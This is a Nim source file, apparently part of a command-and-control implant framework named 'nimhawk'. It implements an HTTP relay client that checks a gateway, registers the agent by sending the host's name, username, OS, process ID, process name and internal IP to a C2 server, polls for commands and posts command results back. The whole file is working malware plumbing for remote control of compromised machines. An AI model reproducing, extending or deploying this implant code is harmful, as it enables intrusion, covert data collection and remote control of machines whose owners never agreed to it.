#[
    Infrastructure Adapter: RelayClientAdapter
    Handles HTTP relay client operations
    Migrated from modules/relay/http_relay_client.nim
]#

import json, puppy, strutils
import ../../domain/models/relay_connection
from ../util/sysinfo import getSysHostname, getUsername, getOSInfo, getCurrentPID, getCurrentProcessName, getLocalIP

type
    RelayClientAdapter* = object
        config*: HttpRelayConfig
    
proc newRelayClientAdapter*(): RelayClientAdapter =
    ## Create a new RelayClientAdapter instance
    result = RelayClientAdapter(
        config: HttpRelayConfig(
            gatewayHost: "",
            gatewayPort: 0,
            relayClientId: "",
            cumulusAgentId: "",
            isConnected: false,
            isRegistered: false
        )
    )

proc initRelayClient*(adapter: var RelayClientAdapter, host: string, port: int, agentId: string): bool =
    ## Initialize HTTP relay client
    try:
        adapter.config.gatewayHost = host
        adapter.config.gatewayPort = port
        adapter.config.relayClientId = agentId
        adapter.config.cumulusAgentId = ""
        adapter.config.isConnected = false
        adapter.config.isRegistered = false
        
        when defined debug:
            echo "[HTTP_RELAY] 🔗 Initialized HTTP relay client"
            echo "[HTTP_RELAY] 🔗 Gateway: " & host & ":" & $port
            echo "[HTTP_RELAY] 🔗 Agent ID: " & agentId
        
        return true
        
    except Exception as e:
        when defined debug:
            echo "[HTTP_RELAY] ❌ Failed to initialize: " & e.msg
        return false

proc testGatewayConnection*(adapter: var RelayClientAdapter): bool =
    ## Test connection to Gateway
    try:
        when defined debug:
            echo "[HTTP_RELAY] 🔍 Testing connection to Gateway"
        
        let url = "http://" & adapter.config.gatewayHost & ":" & $adapter.config.gatewayPort & "/alive"
        
        let response = get(url, timeout = 10)
        
        let bodyMatches = response.body == "OK" or response.body.strip() == "OK"
        if response.code == 200 and bodyMatches:
            adapter.config.isConnected = true
            when defined debug:
                echo "[HTTP_RELAY] ✅ Gateway connection successful"
            return true
        else:
            adapter.config.isConnected = false
            when defined debug:
                echo "[HTTP_RELAY] ❌ Gateway responded with: " & $response.code
            return false
            
    except Exception as e:
        adapter.config.isConnected = false
        when defined debug:
            echo "[HTTP_RELAY] ❌ Connection test failed: " & e.msg
        return false

proc registerCumulusAgentViaGateway*(adapter: var RelayClientAdapter): bool =
    ## Register with C2 via Gateway
    try:
        when defined debug:
            echo "[HTTP_RELAY] 🔐 Registering with C2 via Gateway"
        
        let registrationPayload = %*{
            "command": "GATEWAY_REGISTER_REQUEST",
            "relay_client_id": adapter.config.relayClientId,
            "system_info": %*{
                "hostname": getSysHostname(),
                "username": getUsername(), 
                "os": getOSInfo(),
                "pid": getCurrentPID(),
                "process": getCurrentProcessName(),
                "internal_ip": getLocalIP()
            }
        }
        
        let url = "http://" & adapter.config.gatewayHost & ":" & $adapter.config.gatewayPort & "/proxy"
        
        let response = post(url, headers = @[
            ("Content-Type", "application/json"),
            ("User-Agent", "nimhawk-cumulus-agent")
        ], body = $registrationPayload, timeout = 30)
        
        when defined debug:
            echo "[HTTP_RELAY] 🔐 Registration response: " & $response.code
        
        if response.code == 200:
            try:
                let responseData = parseJson(response.body)
                if responseData.hasKey("id"):
                    adapter.config.cumulusAgentId = responseData["id"].getStr()
                    adapter.config.isRegistered = true
                    
                    when defined debug:
                        echo "[HTTP_RELAY] ✅ Registration successful!"
                        echo "[HTTP_RELAY] ✅ Assigned ID: " & adapter.config.cumulusAgentId
                    
                    return true
            except:
                when defined debug:
                    echo "[HTTP_RELAY] ❌ Failed to parse registration response"
                return false
        
        return false
        
    except Exception as e:
        when defined debug:
            echo "[HTTP_RELAY] ❌ Registration failed: " & e.msg
        return false

proc pollGatewayForCommands*(adapter: RelayClientAdapter): (string, string, seq[string]) =
    ## Poll Gateway for commands via HTTP
    if not adapter.config.isConnected or not adapter.config.isRegistered:
        return ("", "", @[])
    
    try:
        when defined debug:
            echo "[HTTP_RELAY] 📡 Polling Gateway for commands"
        
        let commArray = %*{
            "communication_array": [
                {
                    "agent_id": adapter.config.cumulusAgentId,
                    "ip": adapter.config.gatewayHost & ":" & $adapter.config.gatewayPort,
                    "encrypted_message": "COMMAND_REQUEST"
                }
            ]
        }
        
        let url = "http://" & adapter.config.gatewayHost & ":" & $adapter.config.gatewayPort & "/proxy"
        
        let response = post(url, headers = @[
            ("Content-Type", "application/json")
        ], body = $commArray, timeout = 10)
        
        when defined debug:
            echo "[HTTP_RELAY] 📡 Response status: " & $response.code
        
        if response.code == 200:
            # Parse response for commands
            return ("", "", @[])
        else:
            when defined debug:
                echo "[HTTP_RELAY] ❌ Gateway error: " & $response.code
            return ("", "", @[])
            
    except Exception as e:
        when defined debug:
            echo "[HTTP_RELAY] ❌ Polling error: " & e.msg
        return ("", "", @[])

proc sendResultToGateway*(adapter: RelayClientAdapter, cmdGuid: string, cmdResult: string): bool =
    ## Send command result to Gateway via HTTP
    if not adapter.config.isConnected or not adapter.config.isRegistered:
        return false
    
    try:
        when defined debug:
            echo "[HTTP_RELAY] 📤 Sending result to Gateway"
        
        let commArray = %*{
            "communication_array": [
                {
                    "agent_id": adapter.config.cumulusAgentId,
                    "ip": adapter.config.gatewayHost & ":" & $adapter.config.gatewayPort,
                    "encrypted_message": cmdResult
                }
            ]
        }
        
        let url = "http://" & adapter.config.gatewayHost & ":" & $adapter.config.gatewayPort & "/proxy"
        
        let response = post(url, headers = @[
            ("Content-Type", "application/json")
        ], body = $commArray, timeout = 10)
        
        when defined debug:
            echo "[HTTP_RELAY] 📤 Result sent, response: " & $response.code
        
        return response.code == 200
        
    except Exception as e:
        when defined debug:
            echo "[HTTP_RELAY] ❌ Failed to send result: " & e.msg
        return false

proc isConnected*(adapter: RelayClientAdapter): bool =
    ## Check if HTTP relay client is connected
    return adapter.config.isConnected

proc getConfig*(adapter: RelayClientAdapter): HttpRelayConfig =
    ## Get HTTP relay configuration
    return adapter.config

